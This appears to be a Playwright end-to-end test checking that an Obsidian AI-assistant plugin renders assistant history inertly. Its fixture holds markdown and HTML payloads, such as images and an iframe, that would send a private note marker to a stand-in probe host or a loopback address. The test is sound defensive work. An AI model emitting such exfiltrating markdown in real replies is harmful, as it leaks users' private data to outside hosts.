import { expect, test } from "@playwright/test";

import {
  NATIVE_CORE_PLUGIN_ID,
  startNativeObsidianHarness,
  type NativeObsidianHarness,
} from "./fixtures/nativeObsidianHarness";
import { laneSelectedV1 } from "./fixtures/laneSelection";

const LANE = "safe-assistant-renderer";

test("assistant history renders inertly without remote requests, HTML, or vault embeds", async () => {
  test.skip(process.platform !== "win32", "Obsidian desktop e2e requires Windows.");
  test.skip(!laneSelectedV1(LANE), `Run only with E2E_PLAYWRIGHT_LANE=${LANE}.`);
  test.setTimeout(4 * 60_000);

  const probeHost = "renderer-probe.invalid";
  const privateMarker = `PRIVATE_NOTE_${Date.now()}`;
  const maliciousMarkdown = [
    "# Safe assistant result",
    `![remote](https://${probeHost}/collect?note=${privateMarker})`,
    `![loopback](http://127.0.0.1:9/admin?note=${privateMarker})`,
    `![[E2E Agent Tests/${privateMarker}.md]]`,
    `<iframe src="http://127.0.0.1:9/private?note=${privateMarker}"></iframe>`,
    `<img src="https://${probeHost}/pixel?note=${privateMarker}">`,
    `[ordinary link](https://${probeHost}/manual-only)`,
  ].join("\n");
  const activeProbeRequests: string[] = [];
  let harness: NativeObsidianHarness | null = null;

  try {
    harness = await startNativeObsidianHarness({
      label: "safe-assistant-renderer",
      setup: async ({ page }) => {
        page.on("request", (request) => {
          const url = request.url();
          if (url.includes(probeHost) || url.startsWith("http://127.0.0.1:9/")) {
            activeProbeRequests.push(url);
          }
        });
        await page.evaluate(
          async ({ pluginId, markdown }) => {
            const app = (window as typeof window & { app?: any }).app;
            const plugin = app?.plugins?.plugins?.[pluginId];
            if (!plugin) throw new Error("Agentic Researcher plugin is unavailable.");
            for (const leaf of app.workspace?.getLeavesOfType?.("agentic-researcher-view") ?? []) {
              leaf.detach?.();
            }
            plugin.conversationHistory = [{ role: "assistant", content: markdown }];
            await plugin.activateView?.();
          },
          { pluginId: NATIVE_CORE_PLUGIN_ID, markdown: maliciousMarkdown },
        );
      },
    });

    const message = harness.page.locator(
      ".agentic-researcher-log-assistant .agentic-researcher-log-message",
    );
    await expect(message).toHaveCount(1);
    await expect(message).toHaveClass(/is-rendered/u);
    await expect(message).toContainText("Safe assistant result");
    await expect(message).toContainText("Image blocked: remote");
    await expect(message).toContainText("Image blocked: loopback");
    await expect(message).toContainText(
      `Vault embed blocked: E2E Agent Tests/${privateMarker}.md`,
    );
    await expect(message).toContainText("HTML blocked");
    await expect(message).toContainText(
      `ordinary link (https://${probeHost}/manual-only)`,
    );
    await expect(message.locator("img, iframe, embed, object, a")).toHaveCount(0);
    await harness.page.waitForTimeout(500);
    expect(
      activeProbeRequests,
      "provider-authored assistant history must not trigger remote or loopback requests",
    ).toEqual([]);
  } finally {
    await harness?.close();
  }
});
